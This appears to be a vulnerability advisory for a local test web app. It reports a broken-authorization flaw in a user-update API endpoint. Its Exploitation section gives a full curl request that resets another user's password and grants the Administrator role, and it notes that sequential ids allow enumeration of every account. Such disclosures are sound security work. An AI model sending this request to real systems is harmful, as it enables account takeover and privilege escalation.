# Privilege Escalation

## Overview

An insufficient authorization issue exists in user management API at the following endpoint:

```
http://rws.local:5000/api/users/{id}
```

This can be exploited by an authenticated user to elevate his privilege (role) in the system or reset other user's password due to lack of appropriate authorization control.

## Exploitation

An attacker can send the following request to elevate his privilege or update account of any other user identified by the user id in the URL:

```
curl -X PUT \
  http://rws.local:5000/api/users/2 \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGVzdEB0ZXN0LmNvbSIsInJvbGUiOiJVc2VyIiwiZXhwIjoxNTI2MzgwMzYxLCJpc3MiOiJodHRwOi8vbG9jYWxob3N0LmxvY2FsLyIsImF1ZCI6Imh0dHA6Ly9sb2NhbGhvc3QubG9jYWwvIn0.5ZejCtXrq2vZJJQQxQn2GJ9aeZ2OEi8wuuia6fAAR1Q' \
  -H 'Content-Type: application/json' \
  -d '{
	"name": "Updated User",
	"email": "updated@updated.com",
	"password": "newpassword",
	"passwordConfirmation": "newpassword",
	"role": "Administrator"
}'
```

In this example, the attacker is updating the details of `user id: 2`.

Due to the sequential nature of user id, it is possible to brute force an update details for any user in the system.

## Impact

An attacker can reset credentials for any account or elevate his own privilege by abusing the vulnerable API endpoint.

